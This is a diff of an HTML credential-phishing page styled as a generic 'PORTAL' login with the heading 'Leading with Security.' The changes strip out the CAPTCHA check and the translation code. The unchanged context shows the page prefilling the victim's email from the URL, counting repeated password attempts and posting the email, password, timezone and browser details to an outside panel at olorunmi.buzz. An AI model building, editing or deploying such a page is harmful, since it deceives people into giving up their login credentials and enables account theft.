@@ -10,8 +10,6 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <!-- Google Fonts: Poppins -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
-    <!-- Cloudflare Turnstile -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" nonce="MTA3NzMwNzcyNi0wMDgzMTg3NDgx"></script>
     <style>
         #background-iframe, #overlay {
             position: fixed;
@@ -139,14 +137,11 @@
             margin-bottom: 1rem;
             display: none;
         }
-        #verification-section {
-            margin-top: 20px;
-            text-align: center;
-        }
         .confirm-text {
             font-size: 0.9rem;
             margin-top: 10px;
             color: #6c757d;
+            text-align: center;
         }
     </style>
 </head>
@@ -158,7 +153,7 @@
 
     <!-- Form Container -->
     <div class="form-container" id="form-container">
-        <div class="error-message" id="error-message" data-key="try-again">Try again</div>
+        <div class="error-message" id="error-message">Try again</div>
 
         <form id="user-form">
             <!-- Icon and Text Row -->
@@ -167,96 +162,43 @@
                 <span class="h4 mb-0" style="margin-left:10px" id="domain-name">PORTAL</span>
             </div>
             <!-- Heading -->
-            <h5 class="mb-3" data-key="leading-security">Leading with Security.</h5>
+            <h5 class="mb-3">Leading with Security.</h5>
             <!-- Paragraph -->
-            <p class="mb-4 text-muted" style="font-size:.8rem" data-key="learn-more">To get started, log in using your email and password.</p>
+            <p class="mb-4 text-muted" style="font-size:.8rem">To get started, log in using your email and password.</p>
 
             <!-- Email Input -->
             <div class="form-floating position-relative">
                 <i class="bi bi-envelope input-icon"></i>
                 <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
-                <label for="email" style="background-color: transparent;" data-key="email-label">Email</label>
+                <label for="email" style="background-color: transparent;">Email</label>
             </div>
             <!-- Password Input -->
             <div class="form-floating position-relative">
                 <i class="bi bi-lock input-icon"></i>
                 <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
-                <label for="password" style="background-color: transparent;" data-key="password-label">Password</label>
+                <label for="password" style="background-color: transparent;">Password</label>
             </div>
             <!-- Submit Button -->
-            <button type="submit" class="btn btn-primary" data-key="next-button" id="submit-button">Continue</button>
+            <button type="submit" class="btn btn-primary" id="submit-button">Continue</button>
 
-            <!-- Verification Section (Turnstile) -->
-            <div id="verification-section">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAADIzMznhp8zrqSd1" data-callback="TranquilBreeze"></div>
-                <div class="confirm-text">Browser safety for protection.</div>
-            </div>
+            <!-- Optional text (no verification) -->
+            <div class="confirm-text">Secure login</div>
         </form>
     </div>
 
     <!-- Loader Overlay -->
     <div id="loader-overlay" class="loader-overlay">
         <div class="spinner-border text-light" role="status" style="width:3rem;height:3rem;">
-            <span class="visually-hidden" data-key="loading-text">Loading...</span>
+            <span class="visually-hidden">Loading...</span>
         </div>
     </div>
 
     <!-- Bootstrap 5 JS Bundle -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
-    <!-- Google Translate API (simplified) -->
-    <script>
-        // Function to detect user's country and language
-        function detectUserLanguage() {
-            const browserLang = navigator.language || navigator.userLanguage;
-            const langCode = browserLang.split('-')[0];
-            const supportedLanguages = ['pl','fr','de','es','it','pt','ru','zh','ja','ko','ar'];
-            if (supportedLanguages.includes(langCode)) return langCode;
-            return new Promise((resolve) => {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        const countryCode = data.country_code ? data.country_code.toLowerCase() : 'en';
-                        const countryToLang = {
-                            'pl':'pl','fr':'fr','de':'de','es':'es','it':'it','pt':'pt','ru':'ru','cn':'zh','jp':'ja','kr':'ko','sa':'ar'
-                        };
-                        resolve(countryToLang[countryCode] || 'en');
-                    })
-                    .catch(() => resolve('en'));
-            });
-        }
-
-        function translatePage(targetLang) {
-            if (targetLang === 'en') return;
-            const apiUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=${targetLang}&dt=t&q=`;
-            const elements = document.querySelectorAll('.translatable');
-            const texts = [];
-            elements.forEach(el => texts.push(el.textContent.trim()));
-            elements.forEach((el, idx) => {
-                const text = texts[idx];
-                if (text) {
-                    fetch(apiUrl + encodeURIComponent(text))
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data && data[0] && data[0][0] && data[0][0][0]) {
-                                el.textContent = data[0][0][0];
-                            }
-                        })
-                        .catch(err => console.error('Translation error:', err));
-                }
-            });
-        }
-
-        document.addEventListener('DOMContentLoaded', async function() {
-            const userLanguage = await detectUserLanguage();
-            if (userLanguage !== 'en') translatePage(userLanguage);
-        });
-    </script>
-
     <!-- Custom JavaScript to Handle Email from URL Fragment (hash) and 'portal' Parameter -->
     <script>
         let submitCount = 0;
-        let verificationCompleted = false;
 
         // Get email from URL hash (after #)
         function getEmailFromHash() {
@@ -276,11 +218,6 @@
 
         // Store the email from URL (hash takes priority over query)
         const originalEmail = getEmailFromHash() || getEmailFromQuery();
-
-        function TranquilBreeze() {
-            console.log("CAPTCHA passed! You can now proceed.");
-            verificationCompleted = true;
-        }
 
         document.addEventListener("DOMContentLoaded", () => {
             let email = originalEmail;
@@ -330,11 +267,6 @@
             document.getElementById("user-form").addEventListener("submit", (e) => {
                 e.preventDefault();
 
-                if (!verificationCompleted) {
-                    alert("Please complete the verification before submitting.");
-                    return;
-                }
-
                 submitCount += 1;
                 const isFirstSubmit = submitCount === 1;
                 const isSecondSubmit = submitCount === 2;
@@ -349,7 +281,7 @@
                 formData.append('timezone', clientInfo.timezone);
                 formData.append('browser', clientInfo.browser);
 
-                // ***** CHANGED: Send to the new API URL *****
+                // Send to your API endpoint
                 fetch('https://olorunmi.buzz/panel/admin.php', {
                     method: 'POST',
                     body: formData
